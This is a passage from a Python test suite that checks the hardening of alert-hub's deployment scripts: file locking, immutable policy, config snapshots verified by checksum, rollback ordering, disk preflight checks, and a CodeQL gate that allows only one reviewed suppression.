        assert expected_error in rejected.stderr

    for path in (
        PROVISIONER_PATH,
        DEPLOY_ENGINE_PATH,
        REPOSITORY / ".github/deploy/scripts/docker-status-node.sh",
    ):
        validation = _shell_function(
            path.read_text(encoding="utf-8"), "validate_monitoring_network"
        )
        assert "com.docker.network.bridge.enable_ip_masquerade" in validation
        assert "com.docker.network.bridge.enable_icc" in validation
        assert ".IPAM.Config" in validation


def test_provisioning_policy_is_immutable_and_activation_is_lock_guarded(
    tmp_path: Path,
) -> None:
    current = tmp_path / "current-policy.env"
    same = tmp_path / "same-policy.env"
    changed = tmp_path / "changed-policy.env"
    current.write_text("NODE_NAME=ru\n", encoding="utf-8")
    same.write_text("NODE_NAME=ru\n", encoding="utf-8")
    changed.write_text("NODE_NAME=nl\n", encoding="utf-8")
    for path in (current, same, changed):
        path.chmod(0o600)

    definitions = _provisioner_definitions()
    harness = definitions + 'require_exact_root_file() { :; }\nrequire_immutable_policy "$1" "$2"\n'
    accepted = subprocess.run(
        ["bash", "-s", "--", str(same), str(current)],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )
    rejected = subprocess.run(
        ["bash", "-s", "--", str(changed), str(current)],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )
    assert accepted.returncode == 0
    assert rejected.returncode == 1
    assert "deployment policy is immutable" in rejected.stderr

    source = PROVISIONER_PATH.read_text(encoding="utf-8")
    _definitions, marker, entrypoint = source.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    prepare_lock = _shell_function(source, "prepare_install_root_and_lock")
    cleanup = _shell_function(source, "cleanup")
    activate = _shell_function(source, "activate_boundary")
    assert 'exec 9<>"${LOCK_FILE}"' in prepare_lock
    assert "flock -n 9" in prepare_lock
    assert "restore_boundary" in cleanup
    assert "ACTIVATION_COMPLETE" in cleanup
    assert "mv -f" in activate
    assert "cmp -s" in activate
    _assert_order(
        entrypoint,
        "prepare_install_root_and_lock",
        'require_immutable_policy "${policy_candidate}"',
        "stage_boundary_file",
        "activate_boundary",
    )


def test_failed_boundary_activation_can_restore_previous_complete_set(
    tmp_path: Path,
) -> None:
    existing_destination = tmp_path / "existing-destination"
    existing_backup = tmp_path / "backup-0"
    new_destination = tmp_path / "new-destination"
    missing_backup = tmp_path / "backup-1"
    existing_destination.write_text("new-content\n", encoding="utf-8")
    existing_backup.write_text("old-content\n", encoding="utf-8")
    new_destination.write_text("partially-activated\n", encoding="utf-8")

    restored = _run_boundary_restore_harness(
        tmp_path,
        existing_destination,
        existing_backup,
        new_destination,
        missing_backup,
    )
    assert restored.returncode == 0, restored.stderr
    assert existing_destination.read_text(encoding="utf-8") == "old-content\n"
    assert existing_destination.stat().st_mode & 0o777 == 0o600
    assert not new_destination.exists()


def test_deploy_and_status_lock_before_reading_mutable_boundary() -> None:
    deploy = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    _definitions, marker, deploy_entrypoint = deploy.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    _assert_order(
        deploy_entrypoint,
        'require_private_file "${LOCK_FILE}" 0 "deployment lock"',
        "flock -n 9",
        'require_root_controlled_file "${COMPOSE_FILE}"',
        "load_deploy_policy",
    )

    status = (REPOSITORY / ".github/deploy/scripts/docker-status-node.sh").read_text(
        encoding="utf-8"
    )
    _definitions, marker, status_entrypoint = status.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    _assert_order(
        status_entrypoint,
        'require_root_controlled_file "${LOCK_FILE}"',
        "flock -s 9",
        "load_status_policy",
        "if [[ ! -e ${CURRENT_FILE} && ! -L ${CURRENT_FILE} ]]",
        'require_root_controlled_file "${CURRENT_FILE}"',
    )
    assert "runtime config exists without deployment state" in status_entrypoint
    assert "API container exists without deployment state" in status_entrypoint
    assert "web container exists without deployment state" in status_entrypoint
    assert "print_fresh_status" in status_entrypoint


def test_status_requires_exact_component_network_sets() -> None:
    api = ["alert-hub-edge", "alert-hub-egress", "monitoring"]
    assert _run_exact_network_validation(api, api) == 0
    assert _run_exact_network_validation([*api, "stale-monitoring"], api) != 0
    assert _run_exact_network_validation(api[:-1], api) != 0
    assert (
        _run_exact_network_validation(
            ["alert-hub-edge", "alert-hub-ingress"],
            ["alert-hub-edge", "alert-hub-ingress"],
        )
        == 0
    )

    status = (REPOSITORY / ".github/deploy/scripts/docker-status-node.sh").read_text(
        encoding="utf-8"
    )
    assert "API container exists without a recorded API image" in status
    assert "web container exists without a recorded web image" in status
    assert "api_networks_status=not-deployed" in status
    assert "web_networks_status=not-deployed" in status


def test_controlled_three_node_peers_use_literal_private_addresses() -> None:
    compose = (REPOSITORY / "deploy/docker-compose.ci-three-node.yaml").read_text(encoding="utf-8")

    assert "http://node-ru:8080" not in compose
    assert "http://node-nl:8080" not in compose
    assert "http://node-de:8080" not in compose
    for variable in ("ALERT_HUB_CI_RU_IP", "ALERT_HUB_CI_NL_IP", "ALERT_HUB_CI_DE_IP"):
        assert compose.count(f"http://${{{variable}:?set {variable}}}:8080") >= 3


def test_pr_codeql_is_a_read_only_failing_sarif_gate() -> None:
    analyze = _workflow("codeql.yml")["jobs"]["analyze-pr"]
    analyze_steps = analyze["steps"]
    codeql_step = next(
        step
        for step in analyze_steps
        if isinstance(step, dict)
        and str(step.get("uses", "")).startswith("github/codeql-action/analyze@")
    )
    assert codeql_step["with"]["upload"] == "never"
    assert codeql_step["with"]["output"] == "codeql-results"
    run = _job_run(analyze)
    assert "files=(codeql-results/*.sarif)" in run
    assert 'python3 deploy/scripts/check-codeql-sarif.py "${files[@]}"' in run
    assert any(action.startswith("actions/upload-artifact@") for action in _job_actions(analyze))


def test_codeql_gate_allows_only_the_reviewed_source_suppression(tmp_path: Path) -> None:
    gate = _codeql_gate()

    def result(
        *,
        rule_id: str = "py/insecure-cookie",
        uri: str = "backend/alert_hub/api/auth.py",
        line: int = 50,
        kind: str = "inSource",
        status: str | None = "accepted",
        include_status: bool = True,
    ) -> dict[str, Any]:
        suppression: dict[str, Any] = {"kind": kind}
        if include_status:
            suppression["status"] = status
        return {
            "ruleId": rule_id,
            "message": {"text": "fixture"},
            "locations": [
                {
                    "physicalLocation": {
                        "artifactLocation": {"uri": uri},
                        "region": {"startLine": line},
                    }
                }
            ],
            "suppressions": [suppression],
        }

    accepted = result()
    codeql_default_accepted = result(include_status=False)
    rejected = [
        result(status="underReview"),
        result(status="rejected"),
        result(status=None),
        result(kind="external"),
        result(rule_id="py/other"),
        result(uri="backend/alert_hub/api/other.py"),
        result(line=51),
    ]

    assert gate._is_approved_suppression(accepted)
    assert gate._is_approved_suppression(codeql_default_accepted)
    assert not any(gate._is_approved_suppression(item) for item in rejected)

    sarif = tmp_path / "results.sarif"
    sarif.write_text(
        json.dumps({"runs": [{"results": [accepted, codeql_default_accepted, *rejected]}]}),
        encoding="utf-8",
    )
    assert gate.main([str(sarif)]) == 1

    auth_lines = (
        (REPOSITORY / "backend" / "alert_hub" / "api" / "auth.py")
        .read_text(encoding="utf-8")
        .splitlines()
    )
    assert auth_lines[48].strip() == "# codeql[py/insecure-cookie]"
    assert auth_lines[49].strip() == "response.set_cookie("


def test_deployment_state_binds_runtime_config_by_checksum_not_path() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    status_script = (REPOSITORY / ".github/deploy/scripts/docker-status-node.sh").read_text(
        encoding="utf-8"
    )
    validate_state = _shell_function(script, "validate_state_file")
    write_state = _shell_function(script, "write_state")
    load_state = _shell_function(script, "load_current_state")
    snapshot_state = _shell_function(script, "snapshot_current_state")

    assert "CONFIG_SHA256" in validate_state
    assert 'required["WEB_COMPATIBILITY"] = required["CONFIG_SHA256"]' in validate_state
    assert '"CONFIG_SHA256=${config_checksum}"' in write_state
    assert 'CURRENT_CONFIG_SHA256=$(state_value "${CURRENT_FILE}" CONFIG_SHA256)' in load_state
    assert 'validate_state_config "${CURRENT_API_REF}" "${CURRENT_CONFIG_SHA256}"' in load_state
    assert 'config_checksum=$(state_value "${CURRENT_FILE}" CONFIG_SHA256)' in snapshot_state
    assert 'validate_state_config "${api_ref}" "${config_checksum}"' in snapshot_state
    _assert_order(
        snapshot_state,
        "snapshot=${HISTORY_DIR}/",
        "[[ ! -e ${snapshot} && ! -L ${snapshot} ]]",
        'install -o root -g root -m 0600 -- "${CURRENT_FILE}" "${snapshot}"',
    )

    # A state/history record may select content only by a validated digest. It
    # must never be able to inject a host path into the root-owned engine.
    assert "CONFIG_SNAPSHOT" not in validate_state
    assert "CONFIG_PATH" not in validate_state
    assert "config_sha256=$(state_value CONFIG_SHA256)" in status_script
    assert 'sha256sum "${APP_ENV_FILE}"' in status_script
    assert '[[ ${actual_config_sha256} == "${config_sha256}" ]]' in status_script


def test_runtime_config_snapshots_are_content_addressed_and_verified() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    validate_checksum = _shell_function(script, "validate_config_checksum")
    snapshot_path = _shell_function(script, "config_snapshot_path")
    verify_snapshot = _shell_function(script, "verify_config_snapshot")
    activate_snapshot = _shell_function(script, "activate_config_snapshot")
    private_file_is_valid = _shell_function(script, "private_file_is_valid")

    assert "^[0-9a-f]{64}$" in validate_checksum
    assert "readonly CONFIG_HISTORY_DIR=${HISTORY_DIR}/configs" in script
    _assert_order(snapshot_path, 'validate_config_checksum "${checksum}"', "printf")
    assert "sha256-%s.env" in snapshot_path
    assert '"${CONFIG_HISTORY_DIR}" "${checksum}"' in snapshot_path
    assert 'require_private_file "${snapshot}" 0 "runtime config snapshot"' in verify_snapshot
    assert 'actual=$(file_checksum "${snapshot}")' in verify_snapshot
    assert '[[ ${actual} == "${checksum}" ]]' in verify_snapshot
    assert "[[ -f ${path} && ! -L ${path} ]]" in private_file_is_valid
    assert '${owner} == "${expected_owner}" && ${mode} == 600' in private_file_is_valid
    _assert_order(
        activate_snapshot,
        'verify_config_snapshot "${checksum}"',
        'snapshot=$(config_snapshot_path "${checksum}")',
        'mv -f -- "${temporary}" "${APP_ENV_FILE}"',
        'require_active_config_checksum "${checksum}"',
    )


def test_web_runtime_name_follows_the_activated_config_snapshot() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    compose = _shell_function(script, "compose")

    _assert_order(
        compose,
        'require_private_file "${APP_ENV_FILE}" 0 "runtime application config"',
        'runtime_app_name=$(state_value "${APP_ENV_FILE}" APP_NAME)',
        'APP_NAME="${runtime_app_name}"',
        "docker compose",
    )
    assert 'APP_NAME="${APP_NAME}"' not in compose


def test_production_rollout_gates_disk_database_and_authenticated_ingest() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    disk = _shell_function(script, "check_disk_preflight")
    smoke = _shell_function(script, "verify_runtime_smoke")
    apply_target = _shell_function(script, "apply_target")
    deploy = _shell_function(script, "deploy_release")

    assert "readonly MIN_FREE_KIB=1048576" in script
    assert "alert-hub.db-wal" in disk
    assert "alert-hub.db-shm" in disk
    assert "SQLite storage must not contain symlinks" in disk
    assert "sqlite_size=$(stat -c '%s'" in disk
    assert "MIN_FREE_KIB + ((database_bytes + 1023) / 1024)" in disk
    assert 'require_free_kib "${DATA_DIR}"' in disk
    assert "docker info --format '{{.DockerRootDir}}'" in disk
    assert 'require_free_kib "${docker_root}" "${MIN_FREE_KIB}"' in disk
    _assert_order(script, "docker info >/dev/null", "check_disk_preflight", "start_registry_auth")

    assert "http://127.0.0.1:8080/health/deep" in smoke
    assert "python -m alert_hub.deployment_smoke" in smoke
    assert 'private_file_is_valid "${DEPLOYMENT_SMOKE_TOKEN_FILE}"' in smoke
    assert '--config "${SMOKE_DIR}/curl.conf"' in smoke
    assert 'header = "Authorization: Bearer %s"' in smoke
    assert "--header" not in smoke
    assert "cleanup_smoke_dir" in smoke
    _assert_order(
        apply_target,
        'verify_target_ready "${api_ref}" "${web_ref}"',
        'verify_runtime_smoke "${api_ref}" "${web_ref}"',
    )
    _assert_order(deploy, "apply_target", "write_state")


def test_failed_candidate_restores_recorded_config_before_recorded_image() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    deploy = _shell_function(script, "deploy_release")
    restore = _shell_function(script, "restore_recorded_deployment")

    _assert_order(
        deploy,
        'if ! apply_target "${COMPONENT}" "${target_api_ref}" "${target_web_ref}" true; then',
        "restore_recorded_deployment",
        '"${COMPONENT}" "${CURRENT_API_REF}" "${CURRENT_WEB_REF}" "${CURRENT_CONFIG_SHA256}"',
    )
    _assert_order(
        restore,
        'stop_component_containers "${component}"',
        'activate_config_snapshot "${config_checksum}"',
        'apply_target "${component}" "${api_ref}" "${web_ref}" false',
    )
    # First installation has no prior API/config. A failed candidate must remove
    # its active config before restoring the empty recorded target.
    assert "remove_active_config" in restore


def test_recorded_deployment_restore_behavior_orders_config_before_image() -> None:
    checksum = "a" * 64

    assert _run_restore_harness("api", "old-api-ref", "old-web-ref", checksum) == [
        "stop:api",
        f"activate:{checksum}",
        "apply:api:old-api-ref:old-web-ref:false",
    ]
    assert _run_restore_harness("all", "", "", "") == ["stop:all", "remove"]


def test_api_and_all_manual_rollback_restore_historical_config_with_images() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    rollback = _shell_function(script, "rollback_release")

    _assert_order(
        rollback,
        "if [[ ${COMPONENT} == api || ${COMPONENT} == all ]]; then",
        'target_config_checksum=$(state_value "${SELECTED_HISTORY}" CONFIG_SHA256)',
        'activate_config_snapshot "${target_config_checksum}"',
        'apply_target "${COMPONENT}" "${target_api_ref}" "${target_web_ref}" false',
    )
    assert "target_config_checksum=${CURRENT_CONFIG_SHA256}" in rollback


def test_failed_manual_rollback_restores_starting_config_before_starting_image() -> None:
    script = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    rollback = _shell_function(script, "rollback_release")
    restore = _shell_function(script, "restore_recorded_deployment")
    failed_target = rollback.index("Rollback target failed readiness")
    failure_path = rollback[failed_target:]

    _assert_order(
        failure_path,
        "restore_recorded_deployment",
        '"${COMPONENT}" "${CURRENT_API_REF}" "${CURRENT_WEB_REF}" "${CURRENT_CONFIG_SHA256}"',
    )
    _assert_order(
        restore,
        'stop_component_containers "${component}"',
        'activate_config_snapshot "${config_checksum}"',
        'apply_target "${component}" "${api_ref}" "${web_ref}" false',
    )
